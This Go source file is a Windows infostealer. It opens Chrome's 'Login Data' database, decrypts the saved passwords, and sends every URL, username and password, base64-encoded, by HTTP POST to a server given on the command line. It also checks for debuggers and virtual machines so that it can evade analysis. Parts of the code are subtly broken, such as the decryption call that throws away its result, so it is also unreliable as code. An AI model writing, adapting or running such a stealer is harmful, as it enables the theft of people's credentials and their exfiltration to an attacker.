package main

import (
	"database/sql"
	"encoding/base64"
	"fmt"
	"net/http"
	"os"
	"os/exec"
	"os/user"
	"path/filepath"
	"strings"
	"syscall"
	"unsafe"

	_ "github.com/mattn/go-sqlite3"
	"golang.org/x/sys/windows"
)

func main() {
	if len(os.Args) != 2 {
		fmt.Printf("Usage: %s <SERVER_URL>\n", os.Args[0])
		os.Exit(1)
	}

	if isBeingDebugged() || isRunningInVM() {
		fmt.Println("Debugger or VM detected. Exiting.")
		os.Exit(1)
	}

	serverURL := os.Args[1]
	usr, err := user.Current()
	if err != nil {
		fmt.Println("Error getting current user:", err)
		return
	}

	chromePath := filepath.Join(usr.HomeDir, "AppData", "Local", "Google", "Chrome", "User Data", "Default", "Login Data")
	if _, err := os.Stat(chromePath); os.IsNotExist(err) {
		fmt.Println("Chrome login data not found")
		return
	}

	db, err := sql.Open("sqlite3", chromePath)
	if err != nil {
		fmt.Println("Error opening database:", err)
		return
	}
	defer db.Close()

	rows, err := db.Query("SELECT origin_url, username_value, password_value FROM logins")
	if err != nil {
		fmt.Println("Error querying database:", err)
		return
	}
	defer rows.Close()

	var collectedData []string
	for rows.Next() {
		var originURL, username, passwordEnc string
		err := rows.Scan(&originURL, &username, &passwordEnc)
		if err != nil {
			fmt.Println("Error scanning row:", err)
			continue
		}

		passwordDec, err := decryptChromePassword(passwordEnc)
		if err != nil {
			fmt.Println("Error decrypting password:", err)
			continue
		}

		collectedData = append(collectedData, fmt.Sprintf("URL: %s\nUsername: %s\nPassword: %s\n", originURL, username, passwordDec))
	}

	if len(collectedData) > 0 {
		exfiltrateData(serverURL, collectedData)
	}
}

func decryptChromePassword(data string) (string, error) {
	dataBytes, err := base64.StdEncoding.DecodeString(data)
	if err != nil {
		return "", err
	}

	var outBlob windows.DataBlob
	var prompt windows.CryptProtectPromptStruct

	err = windows.CryptUnprotectData(&windows.DataBlob{
		Size: uint32(len(dataBytes)),
		Data: &dataBytes[0],
	}, nil, nil, nil, 0)
	if err != nil {
		return "", err
	}

	defer windows.LocalFree(windows.Handle(unsafe.Pointer(outBlob.Data)))
	return string(unsafe.Slice((*byte)(unsafe.Pointer(outBlob.Data)), outBlob.Size)), nil
}

func exfiltrateData(serverURL string, data []string) {
	encodedData := base64.StdEncoding.EncodeToString([]byte(strings.Join(data, "\n")))
	http.Post(serverURL, "application/x-www-form-urlencoded", strings.NewReader(fmt.Sprintf("data=%s", encodedData)))
}

func isBeingDebugged() bool {
	var isDebuggerPresent bool
	kernel32 := syscall.NewLazyDLL("kernel32.dll")
	procIsDebuggerPresent := kernel32.NewProc("IsDebuggerPresent")
	ret, _, _ := procIsDebuggerPresent.Call(uintptr(unsafe.Pointer(&isDebuggerPresent)))
	return ret != 0
}

func isRunningInVM() bool {
	vmIndicators := []string{
		"VMware",
		"VirtualBox",
		"QEMU",
		"Hyper-V",
		"KVM",
		"Xen",
	}

	for _, indicator := range vmIndicators {
		if isIndicatorPresent(indicator) {
			return true
		}
	}
	return false
}

func isIndicatorPresent(indicator string) bool {
	cmd := exec.Command("powershell", "-Command", fmt.Sprintf("Get-WmiObject Win32_ComputerSystem | Select-Object -ExpandProperty Manufacturer"))
	output, err := cmd.Output()
	if err != nil {
		return false
	}
	return strings.Contains(string(output), indicator)
}
